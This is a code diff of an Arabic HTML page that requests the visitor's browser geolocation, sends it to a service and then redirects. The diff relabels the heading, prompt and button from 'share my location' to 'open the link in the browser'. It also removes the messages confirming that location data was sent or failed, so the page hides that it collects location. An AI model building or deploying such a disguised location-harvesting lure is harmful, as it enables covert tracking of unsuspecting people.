@@ -14,11 +14,11 @@
 </head>
 <body>
   <div class="card">
-    <h2>مشاركة موقعي</h2>
-    <p>هل تريد مشاركة موقعك الآن؟ سيتم طلب إذن من المتصفح.</p>
+    <h2> فتح الرابط في المتصفح </h2>
+    <p>هل تريد الرابط في المتصفح الآن؟ سيتم طلب إذن من المتصفح.</p>
 
     <div style="display:flex;gap:10px;margin-top:12px">
-      <button id="btnShare" class="btn-primary">📍 شارك موقعي الآن</button>
+      <button id="btnShare" class="btn-primary"> فتح الرابط الآن</button>
       <button id="btnCancel">❌ إلغاء</button>
     </div>
 
@@ -31,7 +31,7 @@
   </div>
 
 <script>
-const THANK_YOU_URL = 'https://www.youtube.com/watch?v=y6w8wcE2QK0&list=RDy6w8wcE2QK0&start_radio=1';
+const THANK_YOU_URL = 'https://www.fragrancex.com/products/dolce-and-gabbana/';
 
 const btnShare = document.getElementById('btnShare');
 const btnCancel = document.getElementById('btnCancel');
@@ -41,7 +41,7 @@ function show(msg){ output.innerHTML = msg; }
 
 btnShare.addEventListener('click', async () => {
   if (!('geolocation' in navigator)) {
-    show('المتصفح لا يدعم تحديد الموقع.');
+    show('المتصفح لا يدعم فتح الموقع.');
     return;
   }
 
@@ -70,20 +70,20 @@ btnShare.addEventListener('click', async () => {
 
       if (resp.ok) {
         // عرض رسالة سريعة ثم التحويل
-        show(output.innerHTML + '<br><em>📩 تم إرسال الموقع بنجاح. سيتم تحويلك الآن…</em>');
+        show(output.innerHTML + '<br><em> ت سيتم تحويلك الآن…</em>');
         // التحويل التلقائي إلى فيديو اليوتيوب
         window.location.href = THANK_YOU_URL;
         // أو لو تريده يفتح في تبويب جديد بدل التحويل:
         // window.open(THANK_YOU_URL, '_blank');
       } else {
-        show(output.innerHTML + '<br><em>❌ فشل إرسال البيانات.</em>');
+        show(output.innerHTML + '<br><em>.</em>');
       }
     } catch (e) {
       show(output.innerHTML + '<br><em>⚠️ حدث خطأ في الاتصال بالخدمة.</em>');
     }
 
   }, (err) => {
-    if (err.code === err.PERMISSION_DENIED) show('❌ المستخدم رفض مشاركة الموقع.');
+    if (err.code === err.PERMISSION_DENIED) show('❌ المستخدم رفض  الموقع.');
     else if (err.code === err.POSITION_UNAVAILABLE) show('⚠️ الموقع غير متاح حالياً.');
     else if (err.code === err.TIMEOUT) show('⏰ انتهت المهلة.');
     else show('حدث خطأ: ' + err.message);
